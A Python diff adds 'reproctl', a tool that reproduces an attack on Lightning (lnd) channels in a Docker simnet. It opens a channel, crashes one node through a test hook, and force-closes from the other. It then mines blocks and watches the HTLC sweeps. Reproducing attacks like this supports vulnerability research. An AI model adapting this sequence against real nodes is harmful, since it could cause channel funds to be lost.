@@ -1,0 +1,582 @@
+#!/usr/bin/env python3
+
+import os
+import argcomplete
+import argparse
+import json
+import subprocess
+import sys
+import time
+from typing import Dict, Tuple
+
+DEFAULT_CHANNEL_CAPACITY = 9000000
+LOG_FILE = "last_run.log"
+DEFAULT_PAYMENT_AMOUNT = 500000
+CONVERSION_FACTOR = 10**8
+
+
+class LndPeer:
+    def __init__(self, name) -> None:
+        self.name = name
+        self.balance = 0
+        self.mining_address = ""
+        self.identity_pubkey = ""
+        self.ip = ""
+        self.funding_txid = ""
+
+
+def myrun(cmd: str, env: Dict={}) -> None:
+    with open(LOG_FILE, "a") as f:
+        f.write(cmd + "\n")
+
+        # if background:
+        #     with subprocess.Popen("nohup " + cmd + f" > {LOG_FILE} &", env=os.environ|env, stdout=f, stderr=subprocess.STDOUT, shell=True, text=True) as proc:
+        #         pass
+        # else:
+        with subprocess.Popen(cmd, env=os.environ|env, stdout=f, stderr=subprocess.STDOUT, shell=True, text=True) as proc:
+            proc.wait()
+            # f.write(str(proc.stdout.read()))
+        #     r = subprocess.run(
+        #         cmd, shell=True, stdout=f, stderr=subprocess.STDOUT, text=True
+        #     )
+        # else:
+        #     r = subprocess.run(
+        #         cmd + " &", shell=True, stdout=f, stderr=subprocess.STDOUT, text=True
+        #     )
+
+
+def myrun_output_raw(cmd: str) -> str:
+    r = subprocess.run(cmd, shell=True, capture_output=True)
+    with open(LOG_FILE, "a") as f:
+        f.write(cmd + "\n")
+        f.write(str(r.stdout) + "\n")
+
+    print("\n" + str(r.stdout.decode("utf-8")))
+
+    return str(r.stdout.decode("utf-8"))
+
+
+def myrun_output_json(cmd: str, pretty_print: bool = False) -> Dict:
+    r = subprocess.run(cmd, shell=True, capture_output=True)
+    with open(LOG_FILE, "a") as f:
+        f.write(cmd + "\n")
+
+        j = json.loads(r.stdout)
+        json_dump = json.dumps(j, indent=4)
+        if pretty_print:
+            print("\n" + json_dump)
+        f.write(json_dump + "\n")
+
+
+    return j
+
+
+def myprint(string: str, end: str = "\n") -> None:
+    print(string, end=end, flush=True)
+    with open(LOG_FILE, "a") as f:
+        f.write(string + end)
+        f.flush()
+
+
+def cleanup():
+    myrun(f"echo > {LOG_FILE}")
+    myprint("Clearing old volumes, containers, and files...", end="")
+    myrun("docker-compose stop")
+    myrun("docker stop alice bob btcd")
+    myrun("docker rm alice bob btcd")
+    myrun(
+        "docker volume rm simnet_lnd_alice simnet_lnd_bob docker_bitcoin docker_lnd docker_shared"
+    )
+    myprint("done.")
+
+
+def setup_docker():
+    myprint("Creating volumes...", end="")
+    myrun("docker volume create simnet_lnd_alice")
+    myrun("docker volume create simnet_lnd_bob")
+    myprint("done.")
+
+    start_lnd_container("alice")
+    start_lnd_container("bob")
+
+
+def start_lnd_container(who: str, gen_volume: bool = True) -> None:
+    myprint(f"Staring container {who}...", end="")
+    volume = ""
+    if gen_volume:
+        volume = f"--volume simnet_lnd_{who}:/root/.lnd"
+
+    myrun(f"docker-compose run -d --name {who} {volume} lnd")
+    myprint("done.")
+
+
+def generate_address(who: LndPeer) -> LndPeer:
+    myprint(
+        f"Generating a new backward compatible nested p2sh address for {who.name}...",
+        end="",
+    )
+    r = retry_loop(
+        myrun_output_json,
+        f"docker exec -i -t {who.name} lncli --network=simnet newaddress np2wkh",
+    )
+    who.mining_address = r["address"]
+    myprint("done.")
+    return who
+
+
+def start_btcd_container(who: LndPeer) -> None:
+    myprint(
+        f"Recreating btcd node and setting {who.name}'s address as mining address...",
+        end="",
+    )
+    env = {"MINING_ADDRESS": who.mining_address}
+    myrun("docker-compose up -d btcd", env=env)
+    myprint("done.")
+
+
+def setup_account(peer1: LndPeer, peer2: LndPeer):
+    peer1 = generate_address(peer1)
+    peer2 = generate_address(peer2)
+
+    myprint(f"{peer1.name}'s p2wkh address: " + peer1.mining_address)
+    myprint(f"{peer2.name}'s p2wkh address: " + peer2.mining_address)
+
+    start_btcd_container(peer1)
+
+    # Generating 400 blocks. We need at least '100 >=' blocks because of coinbase
+    # block maturity and '300 ~=' in order to activate segwit.
+    mine_n(400)
+
+    r = retry_loop(
+        myrun_output_json, "docker exec -it btcd /start-btcctl.sh getblockchaininfo"
+    )
+    segwit = r["bip9_softforks"]["segwit"]["status"]
+    if not segwit == "active":
+        myprint("Segwit is not active for some reason. Exiting.")
+        sys.exit(1)
+    else:
+        myprint("Segwit is active.")
+
+    myprint("Wait 10 seconds for wallet balances to update...")
+    time.sleep(10)
+    get_wallet_balance(peer1, peer2)
+    myprint("done.")
+
+    start_btcd_container(peer1)
+
+
+def setup_channel(
+    peer1: LndPeer, peer2: LndPeer, channel_capacity: int = DEFAULT_CHANNEL_CAPACITY
+) -> Tuple[LndPeer, LndPeer]:
+    myprint(f"Getting {peer2.name}'s pubkey...", end="")
+    r = myrun_output_json(
+        f"docker exec -i -t {peer2.name} lncli --network=simnet getinfo"
+    )
+    peer2.identity_pubkey = r["identity_pubkey"]
+    myprint("done.")
+
+    myprint(f"Getting {peer2.name}'s IP...", end="")
+    r = myrun_output_json(f"docker inspect {peer2.name}")
+    peer2.ip = r[0]["NetworkSettings"]["Networks"]["docker_default"]["IPAddress"]
+    myprint("done.")
+
+    myprint(
+        "Sleeping for 10 seconds to give the rpc interface time to startup...", end=""
+    )
+    time.sleep(10)
+    myprint("done.")
+
+    myprint(
+        f"Creating network connection between {peer1.name} and {peer2.name}...", end=""
+    )
+    myrun(
+        f"docker exec -it {peer1.name} lncli --network=simnet connect {peer2.identity_pubkey}@{peer2.ip}"
+    )
+    myprint("done.")
+
+    myprint("Checking that connection was successful for both peers...", end="")
+    r = myrun_output_json(
+        f"docker exec -i -t {peer1.name} lncli --network=simnet listpeers"
+    )
+    if len(r["peers"]) == 0:
+        myprint(f"{peer1.name}: Connection to {peer2.name} failed")
+        sys.exit(1)
+
+    r = myrun_output_json(
+        f"docker exec -i -t {peer2.name} lncli --network=simnet listpeers"
+    )
+    if len(r["peers"]) == 0:
+        myprint(f"{peer2.name}: Connection to {peer1.name} failed")
+        sys.exit(1)
+    myprint("done.")
+
+    myprint("Wait 10 seconds for wallet balances to update...")
+    time.sleep(10)
+    get_wallet_balance(peer1, peer2)
+    myprint("done.")
+
+    myprint(f"Creating channel between {peer1.name} and {peer2.name}...", end="")
+
+    r = retry_loop(
+        myrun_output_json,
+        f"docker exec -it {peer1.name} lncli --network=simnet openchannel --node_key={peer2.identity_pubkey} --local_amt={channel_capacity}",
+    )
+    funding_txid = r["funding_txid"]
+    peer1.funding_txid = funding_txid
+    peer2.funding_txid = funding_txid
+    myprint("done.")
+    print(f"Funding txid: {funding_txid}")
+
+    start_btcd_container(peer1)
+
+    # Give btcd container time to startup and repopulate mempool before mining
+    time.sleep(10)
+
+    myprint("Including funding transaction in block thereby opening the channel...")
+    mine_n(3)
+    myprint("done opening channel.")
+
+    myprint("Confirming channel creation...", end="")
+    channels = list_channels(peer1.name)
+    if channels["channels"] == 0:
+        myprint(f"FATAL: {peer1.name}: Channel to {peer2.name} not created")
+        sys.exit(1)
+    channels = list_channels(peer2.name)
+    if channels["channels"] == 0:
+        myprint(f"FATAL: {peer2.name}: Channel to {peer1.name} not created")
+        sys.exit(1)
+    myprint("done.")
+
+    myprint("Wait 10 seconds for wallet balances to update...")
+    time.sleep(10)
+    get_wallet_balance(peer1, peer2)
+    myprint("done.")
+
+    return (peer1, peer2)
+
+
+def mine_n(num_blocks: int) -> None:
+    myprint(f"Generating {num_blocks} blocks...", end="")
+    retry_loop(myrun, f"docker exec -it btcd /start-btcctl.sh generate {num_blocks}")
+    myprint(f"done.")
+
+
+def retry_loop(func, *args):
+    while True:
+        try:
+            return func(*args)
+        except:
+            time.sleep(1)
+            pass
+
+
+def make_payment(amount: int, blocking: bool = True) -> str:
+    myprint("Creating invoice from Bob's side...", end="")
+
+    r = myrun_output_json(
+        f"docker exec -it bob lncli --network=simnet addinvoice --amt={amount}"
+    )
+    encoded_invoice = r["payment_request"]
+    myprint("done.")
+
+    myprint("Sending payment...", end="")
+    if blocking:
+        myrun(
+            f"docker exec -it alice lncli --network=simnet sendpayment --force --pay_req={encoded_invoice}",
+        )
+    else:
+        myrun(
+            f"docker exec -dt alice lncli --network=simnet sendpayment --force --pay_req={encoded_invoice}",
+        )
+
+    myprint("done.")
+
+    return r["r_hash"]
+
+
+def get_wallet_balance(*users: LndPeer) -> None:
+    for u in users:
+        r = retry_loop(
+            myrun_output_json,
+            f"docker exec -i -t {u.name} lncli --network=simnet walletbalance",
+        )
+        u.balance = int(r["total_balance"])
+        myprint(f"{u.name}'s wallet balance: " + str(u.balance))
+
+
+def get_channel_balance(*users: LndPeer) -> None:
+    for u in users:
+        r = retry_loop(
+            myrun_output_json,
+            f"docker exec -i -t {u.name} lncli --network=simnet channelbalance",
+        )
+        u.balance = int(r["balance"])
+        myprint(f"{u.name}'s channel balance: " + str(u.balance))
+
+
+def list_channels(who: str) -> Dict:
+    return myrun_output_json(
+        f"docker exec -it {who} lncli --network=simnet listchannels"
+    )
+
+
+def get_funding_txid(peer_name: str, channel_idx: int = 0) -> Tuple[str, int]:
+    cp = list_channels(peer_name)["channels"][channel_idx]["channel_point"]
+    funding_txid, idx_str = cp.split(":")
+    return (funding_txid, int(idx_str))
+
+
+def force_close(local: str, remote: str, funding_txid: str, output_idx: int) -> None:
+    myprint(f"{local} is force closing their channel with {remote}")
+    myrun(
+        f"docker exec -it {local} lncli --network=simnet closechannel --force --funding_txid={funding_txid} --output_index={output_idx}"
+    )
+
+
+def force_close_peers(local: str, remote: str) -> None:
+    funding_txid, idx = get_funding_txid(local)
+    force_close(local, remote, funding_txid, idx)
+
+
+def is_mempool_empty() -> bool:
+    m = retry_loop(myrun_output_json, "docker exec -it btcd /start-btcctl.sh getmempoolinfo")
+    return m['size'] == 0
+
+
+def wait_for_non_empty_mempool():
+    while is_mempool_empty():
+        print("Mempool is empty, sleeping for 2 seconds")
+        time.sleep(2)
+
+
+def print_mempool(args=None) -> None:
+    myrun_output_json("docker exec -it btcd /start-btcctl.sh getmempoolinfo", pretty_print=True)
+    txs = myrun_output_json("docker exec -it btcd /start-btcctl.sh getrawmempool")
+    for tx in txs:
+        tx_raw = myrun_output_raw(f"docker exec -it btcd /start-btcctl.sh getrawtransaction {tx.rstrip()}")
+        d = myrun_output_json(f"docker exec -it btcd /start-btcctl.sh decoderawtransaction {tx_raw.rstrip()}", pretty_print=True)
+        # print(d)
+
+
+def setup_steps(args):
+    alice = LndPeer("alice")
+    bob = LndPeer("bob")
+
+    if args.cleanup:
+        cleanup()
+        return
+    elif args.setup_docker:
+        setup_docker()
+        return
+    elif args.setup_channel:
+        setup_account(alice, bob)
+        setup_channel(alice, bob)
+        return
+    else:
+        cleanup()
+        setup_docker()
+        setup_account(alice, bob)
+        setup_channel(alice, bob)
+
+
+def list_channels_args(args):
+    print(json.dumps(list_channels(args.who), indent=4))
+
+
+def pay(args):
+    myprint(f"Sending {args.amount} from Alice to Bob...")
+    make_payment(amount=args.amount)
+    print("done.")
+
+
+def build(args):
+    if args.proxy:
+        myprint(f"Building proxy container...")
+        myrun("docker build proxyclient/ -t proxy")
+        print("done.")
+    elif args.btcd:
+        myprint(f"Building btcd container...")
+        myrun("docker build btcd/ -t btcd")
+        print("done.")
+    elif args.lnd:
+        myprint(f"Building lnd container...")
+        myrun("docker build .. -t lnd -f ../dev.Dockerfile")
+        print("done.")
+    else:
+        myprint(f"Building lnd container...")
+        myrun("docker build .. -t lnd -f ../dev.Dockerfile")
+        myprint(f"Building btcd container...")
+        myrun("docker build btcd/ -t btcd")
+        # myrun("docker build proxyclient/ -t proxy")
+        print("done.")
+
+
+def transactions(args):
+    tx_raw = myrun_output_raw(
+        f"docker exec -it btcd /start-btcctl.sh getrawtransaction {args.txid}"
+    )
+    myrun_output_raw(
+        f"docker exec -it btcd /start-btcctl.sh decoderawtransaction {tx_raw.rstrip()}"
+    )
+
+
+def balance(args):
+    for who_name in args.who:
+        who = LndPeer(who_name)
+        get_wallet_balance(who)
+        get_channel_balance(who)
+
+
+def mine(args):
+    mine_n(args.blocks)
+
+
+def force_close_args(args):
+    force_close_peers(args.local, args.remote)
+
+
+# def proxy_args(args):
+#     proxy(args.mining_address)
+
+
+# def proxy(mining_address=""):
+#     myprint("Starting test proxy container...")
+#     ma = f"MINING_ADDRESS={mining_address}"
+#     myrun(
+#         f"{ma} docker-compose run -d --name proxy --volume simnet_lnd_alice:/root/alice/.lnd --volume simnet_lnd_bob:/root/bob/.lnd proxy"
+#     )
+#     print("done.")
+
+
+def chain_args(args):
+    myrun_output_raw(f"docker exec -it btcd /start-btcctl.sh {' '.join(args.cmd)}")
+
+
+def attack(args):
+    print("Sending payment...")
+    funding_txid, idx = get_funding_txid("alice")
+
+    # one successful payment
+    make_payment(amount=2*DEFAULT_PAYMENT_AMOUNT, blocking=True)
+    myprint("Wait for balances to update...")
+    time.sleep(10)
+    print("done.")
+
+    myrun("docker exec -it alice touch /crashme.txt")
+    make_payment(amount=DEFAULT_PAYMENT_AMOUNT)
+
+    myprint("Wait for alice to die...")
+    time.sleep(5)
+    print("done.")
+
+    force_close("bob", "alice", funding_txid, idx)
+
+    myprint("Wait for force-close transaction to hit the mempool...")
+    wait_for_non_empty_mempool()
+    print("done.")
+
+    print_mempool()
+    input("Press Enter to bring force-close transaction to maturity by mining 1082 blocks")
+    mine_n(1082)
+
+    myprint("Wait for first round sweep...")
+    wait_for_non_empty_mempool()
+    print("done.")
+
+    print_mempool()
+    input("Press Enter to bring HTLC-success transaction to maturity by mining 1081 blocks")
+    mine_n(1081)
+
+    myprint("Wait for second round sweep...")
+    wait_for_non_empty_mempool()
+    print("done.")
+
+    print_mempool()
+    input("Press Enter to confirm second round sweep")
+    mine_n(1)
+    print("done.")
+
+    myprint("Wait for wallet to update...")
+    time.sleep(10)
+    print("done.")
+
+    bob = LndPeer("bob")
+    get_wallet_balance(bob)
+    get_channel_balance(bob)
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(prog="reproctl", description="Reproduces attack")
+    subparsers = parser.add_subparsers(required=True)
+    repro_parser = subparsers.add_parser("setup", help="Reproduce attack")
+    repro_parser.add_argument(
+        "-c", "--cleanup", action="store_true", help="Cleanup old runs"
+    )
+    repro_parser.add_argument(
+        "-sd", "--setup_docker", action="store_true", help="Setup the docker nodes"
+    )
+    repro_parser.add_argument(
+        "-sc", "--setup_channel", action="store_true", help="Setup the channel"
+    )
+    repro_parser.set_defaults(func=setup_steps)
+
+    pay_parser = subparsers.add_parser("pay", help="Make a payment")
+    pay_parser.add_argument("amount", type=int, help="Payment amount")
+    pay_parser.set_defaults(func=pay)
+
+    build_parser = subparsers.add_parser("build", help="Rebuild container")
+    build_parser.add_argument(
+        "-p", "--proxy", action="store_true", help="Rebuild only the proxy"
+    )
+    build_parser.add_argument(
+        "-b", "--btcd", action="store_true", help="Rebuild only btcd"
+    )
+    build_parser.add_argument(
+        "-l", "--lnd", action="store_true", help="Rebuild only btcd"
+    )
+    build_parser.set_defaults(func=build)
+
+    balance_parser = subparsers.add_parser("balance", help="Get user balances")
+    balance_parser.add_argument("who", type=str, default="bob", nargs='+', help="Who's balances to get")
+    balance_parser.set_defaults(func=balance)
+
+    mining_parser = subparsers.add_parser("mine", help="Mine blocks")
+    mining_parser.add_argument("blocks", default=1, help="Number of blocks to mine")
+    mining_parser.set_defaults(func=mine)
+
+    closure_parser = subparsers.add_parser("forceclose", help="Force close the channel")
+    closure_parser.add_argument("local", help="Who initiates force close")
+    closure_parser.add_argument(
+        "remote", help="Who is the non-consenting party to the force close"
+    )
+    closure_parser.set_defaults(func=force_close_args)
+
+    list_chan_parser = subparsers.add_parser("listchannels", help="List the channels")
+    list_chan_parser.add_argument("who", help="Who's channels to list")
+    list_chan_parser.set_defaults(func=list_channels_args)
+
+    mempool_parser = subparsers.add_parser(
+        "mempool", help="Print the mempool transactions"
+    )
+    mempool_parser.set_defaults(func=print_mempool)
+
+    # proxy_parser = subparsers.add_parser("proxy", help="Control the proxy node")
+    # proxy_parser.set_defaults(func=proxy_args)
+    # proxy_parser.add_argument(
+    #     "mining_address", help="Mining address for btcd container"
+    # )
+
+    tx_parser = subparsers.add_parser("tx", help="Parse transactions")
+    tx_parser.set_defaults(func=transactions)
+    tx_parser.add_argument("txid", help="Transaction ID")
+
+    attack_parser = subparsers.add_parser("attack", help="Run attack scenario")
+    attack_parser.set_defaults(func=attack)
+    attack_parser.add_argument("id", type=int, help="Attack scenario")
+
+    chain_parser = subparsers.add_parser("btcctl", help="Run btcctl commands")
+    chain_parser.set_defaults(func=chain_args)
+    chain_parser.add_argument("cmd", type=str, nargs="+", help="btcctl command")
+
+    argcomplete.autocomplete(parser)
+    args = parser.parse_args()
+    args.func(args)
